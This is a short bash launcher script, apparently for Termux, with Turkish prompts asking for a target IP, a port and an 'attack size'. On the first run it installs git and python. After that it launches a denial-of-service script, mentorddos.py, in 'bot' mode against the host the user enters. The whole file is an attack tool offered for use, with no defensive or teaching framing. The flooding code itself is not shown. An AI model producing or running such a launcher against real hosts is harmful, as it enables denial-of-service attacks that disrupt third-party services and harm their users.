#!/bin/bash
clear

banner(){

echo -e "\e[31m
◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
__ _            _____ ____  \e[39m
|  ___(_)_ __ __  _|_   _|  _ \ \e[39m
| |_  | | '_ \\ \/ / | | | |_) |\e[39m
|  _| | | | | |>  <  | | |  _ < \e[39m
|_|   |_|_| |_/_/\_\ |_| |_| \_\\e[39m
                                 \e[39m

         FinxTR
◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
"
}

if [[ -e "Finx" ]]; then
	banner
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mHedef IP : ' ip
	echo -e ""
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
	echo -e ""
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mSaldırı Boyutu [Normal 135] : ' mb
	echo -e ""
	cd Script && 
	python mentorddos.py --method "bot" --threads $mb --ip $ip --port $port 
else
mkdir Finx
apt update && apt upgrade -y 
pkg install git -y 
pkg install python python2 -y
echo -e "\e[31mKurulum Bitti"
sleep 1
bash tst.sh


fi
